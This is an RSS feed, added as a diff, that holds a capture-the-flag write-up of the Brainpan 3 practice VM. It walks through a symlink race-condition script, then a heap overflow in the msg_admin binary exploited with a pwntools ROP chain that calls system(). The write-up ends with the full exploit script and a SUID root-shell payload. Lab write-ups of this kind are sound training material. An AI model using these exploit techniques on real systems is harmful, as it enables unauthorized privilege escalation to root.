@@ -1,0 +1,2367 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Brainpan on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/brainpan/</link>
+    <description>Recent content in Brainpan on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 26 Sep 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/brainpan/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Brainpan: 3 - Part 2</title>
+      <link>http://rastamouse.me/writeups/2015/brainpan-3-part-2/</link>
+      <pubDate>Sat, 26 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/brainpan-3-part-2/</guid>
+      <description>
+
+&lt;p&gt;Now that we&amp;rsquo;ve popped &lt;code&gt;anansi&lt;/code&gt; and &lt;code&gt;reynard&lt;/code&gt;, it&amp;rsquo;s time to go after &lt;code&gt;puck&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt;!&lt;/p&gt;
+
+&lt;p&gt;There is something listening on the loopback at port &lt;code&gt;7075&lt;/code&gt;.  When we connect, we get a message about a key.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ netstat -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN
+
+$ nc localhost 7075
+Incorrect key
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The first step is to find the service which is bound to the port.  I did it by finding where the binary on port &lt;code&gt;1337&lt;/code&gt; was, and it happened to be in the same location.  Lucky.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ps aux
+anansi    1070  0.0  0.1   2044   556 ?        Ss   08:30   0:00 brainpan3
+
+$ ls -l /proc/1070/exe
+lrwxrwxrwx 1 anansi webdev 0 Sep 26 08:56 /proc/1070/exe -&amp;gt; /usr/local/sbin/brainpan3
+
+$ ls -l /usr/local/sbin
+total 32
+-rwxr-xr-x 1 root root 16589 May 26 18:38 brainpan3
+-rwxr-xr-x 1 root root  7609 May 20 10:18 trixd
+-rwxr-xr-x 1 root root   343 May 21 11:38 www
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Transfer &lt;code&gt;trixd&lt;/code&gt; for analysis.  If we just run it, we drop into a shell.  Also, if we run &lt;code&gt;strings&lt;/code&gt; we see some familiar bit and bobs - confirming we have the correct binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./trixd 
+open: No such file or directory
+open: No such file or directory
+Authentication successful
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@kali:~/bp3# strings trixd 
+/mnt/usb/key.txt
+Key file is compromised.
+/home/puck/key.txt
+open
+Authentication successful
+/bin/sh
+Incorrect key
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So the binary does a string compare between &lt;code&gt;/home/puck/key.txt&lt;/code&gt; and &lt;code&gt;/mnt/usb/key.txt&lt;/code&gt;, if they match &lt;code&gt;/bin/sh&lt;/code&gt; is executed.  We can write to &lt;code&gt;/mnt/usb/&lt;/code&gt;, so the obvious solution is to drop in a symlink&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -lR /mnt/
+/mnt/:
+total 4
+drwxrwx--- 2 reynard dev 4096 Jun 17 22:11 usb
+
+/mnt/usb:
+total 4
+-rw-r--r-- 1 reynard reynard 21 Jun 17 22:11 key.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ rm /mnt/usb/key.txt
+$ ln -s /home/puck/key.txt /mnt/usb/key/txt
+
+$ ls -l /mnt/usb/
+lrwxrwxrwx 1 reynard webdev 18 Sep 26 09:16 key.txt -&amp;gt; /home/puck/key.txt
+
+$ nc localhost 7075
+Key file is compromised.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bawwww :(  The binary is wise to us.  Now&amp;hellip; the bitch about this is that it&amp;rsquo;s been compiled with a ptrace trap, which means we can&amp;rsquo;t easily debug it.  So I kinda went on blind faith here (and a hint from barrebas).  The symlink check is called before the string compare.  So if we are quick enough, we can place a file there to pass the symlink check, then swap it for a symlink.  This is called a race condition.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-3/speedy-gonzales.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&#34;a-race-to-win:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Race to Win&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import os, time
+
+while True:
+        os.mknod(&#39;/mnt/usb/key.txt&#39;, 0666)
+        time.sleep(0.1)
+        os.remove(&#39;/mnt/usb/key.txt&#39;)
+        os.symlink(&#39;/home/puck/key.txt&#39;, &#39;/mnt/usb/key.txt&#39;)
+        time.sleep(0.1)
+        os.remove(&#39;/mnt/usb/key.txt&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then in another shell&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ while :; do nc localhost 7075; done 
+Incorrect key
+Incorrect key
+Incorrect key
+Authentication successful
+$ id
+uid=1001(puck) gid=1004(dev) groups=1001(puck)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;path-to-root:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Path to Root&lt;/h2&gt;
+
+&lt;p&gt;Now that we can read inside &lt;code&gt;puck&#39;s&lt;/code&gt; home directory, we can get the content of &lt;code&gt;key.txt&lt;/code&gt;.  I found it handy to grab this in case I lost shell access - you can write the content into &lt;code&gt;/mnt/usb/key.txt&lt;/code&gt; so you don&amp;rsquo;t have to win the race condition over again.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /home/puck/key.txt
+HBN48HY71ERG5GA6290V
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we check out the following cronjob and follow the trail&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /etc/cron.d/
+-rw-r--r-- 1 root root 100 May 19 18:25 msg_admin
+
+$ cat /etc/cron.d/msg_admin
+* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
+
+$ ls -laR /opt
+drwxrwx---  3 root dev  4096 Jun 10 22:32 .messenger
+
+/opt/.messenger:
+drwx------ 2 root root 4096 Jun 10 22:32 NOTIFY
+
+$ ls -l /usr/local/bin/msg_admin
+-rwxr-xr-x 1 root root 12316 May 31 04:46 /usr/local/bin/msg_admin
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;a-heap-of-trouble:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;A Heap of Trouble&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./msg_admin 
+Usage: ./msg_admin priority message.txt
+Message file format: requestername|message
+Eg: tony|Add a new user to repo
+Can have multiple messages in a single file separated by newlines.
+Eg: tony|Please remove /tmp/foo
+    cate|Reset password request.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# file msg_admin 
+msg_admin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fb794eca10a43b1fd6f55c5959d818be9c5f70d0, not stripped
+
+gdb-peda$ checksec 
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After disassembling the binary, we work out that messages are stored on the heap.  I think 10 bytes are assigned for the &lt;code&gt;requestorname&lt;/code&gt; and 200 for the &lt;code&gt;message&lt;/code&gt;.  If we submit two messages and inspect the heap, we can see where the data is stored.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;B&amp;quot; * 200
+buf += &amp;quot;\n&amp;quot;
+
+buf += &amp;quot;C&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;D&amp;quot; * 200
+
+f = open(&amp;quot;message.txt&amp;quot;, w)
+f.write(buf)
+f.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r 1 message.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-3/heap-layout.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I&amp;rsquo;ve highlighted the various pointers - you can see how they point to the start of the &lt;code&gt;requestorname&lt;/code&gt; and &lt;code&gt;message&lt;/code&gt; inputs.  We can add more byes to message 1, and have it overflow the pointer for message 2 requestorname.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;B&amp;quot; * 212
+buf += &amp;quot;XXXX&amp;quot;
+buf += &amp;quot;\n&amp;quot;
+
+buf += &amp;quot;C&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;D&amp;quot; * 200
+
+f = open(&amp;quot;message.txt&amp;quot;, w)
+f.write(buf)
+f.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;EAX: 0x43434343 (&#39;CCCC&#39;)
+EBX: 0x804c170 (&amp;quot;CCCCCCCCCC&amp;quot;)
+ECX: 0x804c170 (&amp;quot;CCCCCCCCCC&amp;quot;)
+EDX: 0x58585858 (&#39;XXXX&#39;)
+
+gdb-peda$ x/120wx 0x804c388
+0x804c388:	0x00000001	0x0804c398	0x0804c3a8	0x00000011
+0x804c398:	0x41414141	0x41414141	0x00004141	0x000000d1
+0x804c3a8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3b8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3c8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3d8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3e8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c3f8:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c408:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c418:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c428:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c438:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c448:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c458:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c468:	0x42424242	0x42424242	0x42424242	0x42424242
+0x804c478:	0x42424242	0x58585858	0x0804c400
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I&amp;rsquo;ll overwrite this pointer with &lt;code&gt;strtok&lt;/code&gt; from the &lt;code&gt;GOT&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# objdump -R msg_admin
+
+msg_admin:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+0804affc R_386_GLOB_DAT    __gmon_start__
+0804b00c R_386_JUMP_SLOT   getline
+0804b010 R_386_JUMP_SLOT   printf
+0804b014 R_386_JUMP_SLOT   fclose
+0804b018 R_386_JUMP_SLOT   time
+0804b01c R_386_JUMP_SLOT   uname
+0804b020 R_386_JUMP_SLOT   __stack_chk_fail
+0804b024 R_386_JUMP_SLOT   rewind
+0804b028 R_386_JUMP_SLOT   strcat
+0804b02c R_386_JUMP_SLOT   strcpy
+0804b030 R_386_JUMP_SLOT   malloc
+0804b034 R_386_JUMP_SLOT   puts
+0804b038 R_386_JUMP_SLOT   __gmon_start__
+0804b03c R_386_JUMP_SLOT   strftime
+0804b040 R_386_JUMP_SLOT   localtime
+0804b044 R_386_JUMP_SLOT   strlen
+0804b048 R_386_JUMP_SLOT   __libc_start_main
+0804b04c R_386_JUMP_SLOT   atol
+0804b050 R_386_JUMP_SLOT   fopen
+0804b054 R_386_JUMP_SLOT   memset
+0804b058 R_386_JUMP_SLOT   strncpy
+0804b05c R_386_JUMP_SLOT   strtok
+0804b060 R_386_JUMP_SLOT   fputs
+0804b064 R_386_JUMP_SLOT   strncat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+from pwn import *
+
+_strtok = 0x0804b05c
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;B&amp;quot; * 212
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+
+buf += &amp;quot;CCCC&amp;quot;
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;D&amp;quot; * 200
+
+f = open(&amp;quot;message.txt&amp;quot;, &amp;quot;w&amp;quot;)
+f.write(buf)
+f.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
+0x43434343 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now that we have control over EIP, the real work begins.  We have &lt;code&gt;NX&lt;/code&gt; and &lt;code&gt;ASLR&lt;/code&gt; to bypass, so we&amp;rsquo;ll be ROP&amp;rsquo;ing our way down victory lane.  First, let&amp;rsquo;s find a pop ret gadget, to keep our stack aligned and maintain execution flow.  We&amp;rsquo;ve crashed on our &lt;code&gt;C&#39;s&lt;/code&gt;, so this gadget will go here.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# /opt/ropeme/ropeme/ropshell.py 
+ROPeMe&amp;gt; generate /root/bp3/msg_admin 30
+ROPeMe&amp;gt; search pop %
+0x8048ddcL: pop ebx ; pop esi ; pop edi ; pop ebp ;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;B&amp;quot; * 212
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+buf += p32(_ppppr)
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;D&amp;quot; * 200
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After the &lt;code&gt;ppppr&lt;/code&gt;, we return into our stack of &lt;code&gt;B&#39;s&lt;/code&gt;, so the rest of our payload will go into the body of &lt;code&gt;message 1&lt;/code&gt;.  We should now return here each time.&lt;/p&gt;
+
+&lt;p&gt;There isn&amp;rsquo;t a call to &lt;code&gt;system&lt;/code&gt; anywhere in the binary, so we have to construct our own ROP chain to get its address EAX, then &lt;code&gt;call eax&lt;/code&gt;.  Let&amp;rsquo;s find some gadgets that may be useful in this quest.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ROPeMe&amp;gt; search mov eax %
+ROPeMe&amp;gt; search add eax %
+ROPeMe&amp;gt; search sub eax %
+ROPeMe&amp;gt; search pop ebx %
+ROPeMe&amp;gt; search call eax %
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I figure we should get an address of another GOT into EAX, calculate its offset to system and modify EAX accordingly.  I don&amp;rsquo;t think the &lt;code&gt;sub eax&lt;/code&gt; gadget is useable, so I need a GOT entry which is &lt;em&gt;smaller&lt;/em&gt; than system, then &lt;em&gt;add&lt;/em&gt; to it.&lt;/p&gt;
+
+&lt;p&gt;I found a way to do this quite nicely using &lt;code&gt;pwntools&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+from pwn import *
+
+elf = ELF(&#39;/root/bp3/msg_admin&#39;)
+libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+
+print &amp;quot;[+] System is at &amp;quot; + hex(libc.symbols[&#39;system&#39;])
+
+for symbol in elf.symbols:
+        try: print &amp;quot;\t[&amp;gt;] &amp;quot; + symbol + &amp;quot; is at &amp;quot; + hex(libc.symbols[symbol])
+        except: pass
+
+print &amp;quot;\n&amp;quot;
+
+for symbol in elf.symbols:
+        try:
+                if libc.symbols[symbol] &amp;lt; libc.symbols[&#39;system&#39;]:
+                        print &amp;quot;[+] &amp;quot; + symbol + &amp;quot; is lower: &amp;quot; + hex(libc.symbols[symbol])
+        except: pass
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./libc.py 
+[+] System is at 0x3de10
+    [&amp;gt;] fclose is at 0x10ea80
+    [&amp;gt;] uname is at 0xa0590
+    [&amp;gt;] __libc_start_main is at 0x19630
+    [&amp;gt;] printf is at 0x4c970
+    [&amp;gt;] fopen is at 0x10e840
+    [&amp;gt;] strncpy is at 0x7a040
+    [&amp;gt;] puts is at 0x64ab0
+    [&amp;gt;] strtok is at 0x7b170
+    [&amp;gt;] fputs is at 0x63560
+    [&amp;gt;] getline is at 0x60b60
+    [&amp;gt;] localtime is at 0x91690
+    [&amp;gt;] atol is at 0x2f2c0
+    [&amp;gt;] __stack_chk_fail is at 0xe5790
+    [&amp;gt;] malloc is at 0x758c0
+    [&amp;gt;] memset is at 0x7b6c0
+    [&amp;gt;] strcat is at 0x79350
+    [&amp;gt;] got.malloc is at 0x16d014
+    [&amp;gt;] strlen is at 0x79d10
+    [&amp;gt;] strncat is at 0x79e80
+    [&amp;gt;] rewind is at 0x6af60
+    [&amp;gt;] strcpy is at 0x79740
+    [&amp;gt;] time is at 0x91f00
+    [&amp;gt;] strftime is at 0x97c00
+
+
+[+] __libc_start_main is lower: 0x19630
+[+] atol is lower: 0x2f2c0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Only &lt;code&gt;atol&lt;/code&gt; is lower than &lt;code&gt;system&lt;/code&gt;, kinda made me think I was on the right track.  The difference between &lt;code&gt;0x3de10&lt;/code&gt; and &lt;code&gt;0x2f2c0&lt;/code&gt; is &lt;code&gt;0xeb50&lt;/code&gt;.  First, we want to clear EAX to 0, so it&amp;rsquo;s in a nice state to work with.&lt;/p&gt;
+
+&lt;p&gt;There&amp;rsquo;s a pretty handy gadget that&amp;rsquo;ll do that for us:
+&lt;code&gt;0x8048790L: mov eax 0x804b074 ; sub eax 0x804b074&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074 
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += p32(_0eax)
+buf += &amp;quot;B&amp;quot; * (212 - 4)
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+buf += p32(_ppppr)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I let it SEGFAULT again, but we can now see&amp;hellip; &lt;code&gt;EAX: 0x0&lt;/code&gt;.  Good.  Now let&amp;rsquo;s throw in our &lt;code&gt;pop ebx&lt;/code&gt; gadget and address for &lt;code&gt;atol&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol)
+buf += &amp;quot;B&amp;quot; * (212 - 12)
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+buf += p32(_ppppr)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This time, when we crash:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;EAX: 0x0 
+EBX: 0x804b04c --&amp;gt; 0xb7e3f820 (&amp;lt;atol&amp;gt;:	sub    esp,0x1c)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now the &lt;code&gt;add eax&lt;/code&gt;, but there&amp;rsquo;s a slight twist here.  The gadget I&amp;rsquo;m using is: &lt;code&gt;add eax [ebx+0x1270304]&lt;/code&gt; - it will take whatever is in EBX, add 0x1270304 to it, then put it in EAX.  It means that I have to subtract this value away from &lt;code&gt;atol&lt;/code&gt; to compensate.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d 
+_addeax = 0x8048feb             # add eax [ebx+0x1270304]
+_offset = 0x1270304
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol - _offset)
+buf += p32(_addeax)
+buf += &amp;quot;B&amp;quot; * (212 - 16)
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+buf += p32(_ppppr)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Crash, and: &lt;code&gt;EAX: 0xb7e3f820 (&amp;lt;atol&amp;gt;:   sub    esp,0x1c)&lt;/code&gt;.  So far, so good!  I&amp;rsquo;ve already established the amount I need to add, so I need to find values within the binary that I can use that will add up to &lt;code&gt;0xeb50&lt;/code&gt;.  The closest I could find was: &lt;code&gt;0x8049f67 --&amp;gt; 0xeb00&lt;/code&gt; and &lt;code&gt;0x8048130 --&amp;gt; 0x10&lt;/code&gt;.  Let&amp;rsquo;s add all of those in and see what happens.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d
+_addeax = 0x8048feb             # add eax [ebx+0x1270304]
+_offset = 0x1270304
+
+_eb00 = 0x8049f67
+_10 = 0x8048130
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_eb00 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_10 - _offset)
+buf += p32(_addeax)
+
+buf += &amp;quot;B&amp;quot; * (212 - 76)
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+buf += p32(_ppppr)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Crash:  &lt;code&gt;EAX: 0xb7e4e360 (&amp;lt;__libc_system&amp;gt;:  push   ebx)&lt;/code&gt;.  We&amp;rsquo;re on the home straight now.&lt;/p&gt;
+
+&lt;p&gt;We need an argument to put into system - luckily there&amp;rsquo;s a static reference to &lt;code&gt;/tmp/foo&lt;/code&gt; in the binary - if you recall its help message.  &lt;code&gt;0x8048eef (&amp;quot;/tmp/foo&amp;quot;)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;_calleax = 0x8048786            # call eax ; leave
+_foo = 0x8048eef
+
+buf += p32(_calleax)
+buf += p32(_foo)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r 1 message.txt 
+Starting program: /root/bp3/msg_admin 1 message.txt
+[+] Recording 2 entries
+# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it works on my local box - I just copied &lt;code&gt;/bin/sh&lt;/code&gt; as a simple test.  Time to copy &lt;code&gt;message.txt&lt;/code&gt; across to bp3 (again with &lt;code&gt;xxd&lt;/code&gt;).  For the cronjob to pick it up, it must be within &lt;code&gt;/opt/.messenger/&lt;/code&gt; and have the &lt;code&gt;.msg&lt;/code&gt; extension.  You know the job has run, because after the message has been processed, it gets deleted.&lt;/p&gt;
+
+&lt;h2 id=&#34;failed:f6785c09a6136b44cc09f2d03fcc82fd&#34;&gt;Failed?&lt;/h2&gt;
+
+&lt;p&gt;My &lt;code&gt;/tmp/foo&lt;/code&gt; payload on bp3 was to create a SUID shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cp /bin/sh /tmp/pwn
+chmod 4777 /tmp/pwn
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But unfortunately it wasn&amp;rsquo;t working :( I tried copying it in a few times - it would get deleted, but there was no SUID shell in &lt;code&gt;/tmp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;I had a look at &lt;code&gt;libc&lt;/code&gt; on bp3 and found that the offsets between &lt;code&gt;atol&lt;/code&gt; and &lt;code&gt;system&lt;/code&gt; was different than on my box.  *sigh*.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep atol
+  1778: 00031890    35 FUNC    GLOBAL DEFAULT   12 atol@@GLIBC_2.0
+
+$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+  620: 00040190    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The difference here is &lt;code&gt;0xE8D0&lt;/code&gt;!  This meant I had to go back and find new values for my increments, which turned out to be a good thing because I found a way to do it in just two adds.&lt;/p&gt;
+
+&lt;p&gt;This is my final exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+from pwn import *
+
+_strtok = 0x0804b05c
+_ppppr = 0x8048ddc
+_atol = 0x804b04c
+_0eax = 0x8048790               # mov eax 0x804b074 ; sub eax 0x804b074
+_popebx = 0x804859d
+_addeax = 0x8048feb             # add eax [ebx+0x1270304]
+_offset = 0x1270304
+_calleax = 0x8048786            # call eax ; leave
+
+_e800 = 0x80480c7
+_100 = 0x8048013
+
+_foo = 0x8048eef
+
+buf = &amp;quot;A&amp;quot; * 10
+buf += &amp;quot;|&amp;quot;
+buf += p32(_0eax)
+buf += p32(_popebx)
+buf += p32(_atol - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_e800 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_popebx)
+buf += p32(_100 - _offset)
+buf += p32(_addeax)
+
+buf += p32(_calleax)
+buf += p32(_foo)
+
+buf += &amp;quot;B&amp;quot; * (212 - 48)
+buf += p32(_strtok)
+buf += &amp;quot;\n&amp;quot;
+
+buf += p32(_ppppr)
+buf += &amp;quot;|&amp;quot;
+buf += &amp;quot;D&amp;quot; * 200
+
+f = open(&amp;quot;message.txt&amp;quot;, &amp;quot;w&amp;quot;)
+f.write(buf)
+f.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /tmp
+-rwxr-xr-x 1 puck dev      40 Oct  9 15:15 foo
+-rwsrwxrwx 1 root root 112204 Oct  9 22:31 pwn
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /tmp/pwn
+$ id
+uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)
+
+$ ls -l /root
+-rw------- 1 root root 314 Jun 23 12:45 brainpan.8.gz
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Unzip the file, then check it out.&lt;/p&gt;
+
